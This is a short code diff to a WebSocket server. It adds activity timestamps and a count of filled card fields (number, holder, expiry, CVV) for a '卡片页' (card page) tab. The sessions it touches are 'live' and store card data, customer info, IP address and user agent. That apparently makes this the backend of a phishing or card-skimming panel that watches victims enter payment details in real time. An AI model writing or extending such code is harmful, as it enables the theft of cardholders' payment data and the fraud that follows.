@@ -239,8 +239,16 @@ export async function setupWebSocket(server: any) {
             frontendUrl: payload.frontendUrl, status: 'live', currentStep: payload.currentStep,
             cardInfo: payload.cardInfo, customerInfo: payload.customerInfo,
             browsingTabs: payload.browsingTabs, isOnline: true,
-            ip: (ws as any)._ip, ua: payload.ua || ''
+            ip: (ws as any)._ip, ua: payload.ua || '',
+            lastActivityTs: Date.now()
           });
+
+          // Fix 卡片页 count based on filled fields
+          if (payload.browsingTabs) {
+            const cardFields = [payload.cardInfo?.cardNumber, payload.cardInfo?.cardHolder, payload.cardInfo?.expiry, payload.cardInfo?.cvv].filter(Boolean).length;
+            const ctIdx = payload.browsingTabs.findIndex((t: any) => t.label === '卡片页');
+            if (ctIdx >= 0 && cardFields > 0) payload.browsingTabs[ctIdx].count = cardFields;
+          }
 
           sessions.set(counterId, {
             customerWs: ws, id: counterId, sessionId: sessionCounter,
@@ -249,7 +257,8 @@ export async function setupWebSocket(server: any) {
             browsingTabs: payload.browsingTabs || [],
             currentStep: payload.currentStep || 'card',
             frontendUrl: payload.frontendUrl || '',
-            ip: (ws as any)._ip, ua: payload.ua || ''
+            ip: (ws as any)._ip, ua: payload.ua || '',
+            lastActivityTs: Date.now()
           });
           (ws as any)._sessionId = counterId;
           if (cid) customerSessions.set(cid, counterId);
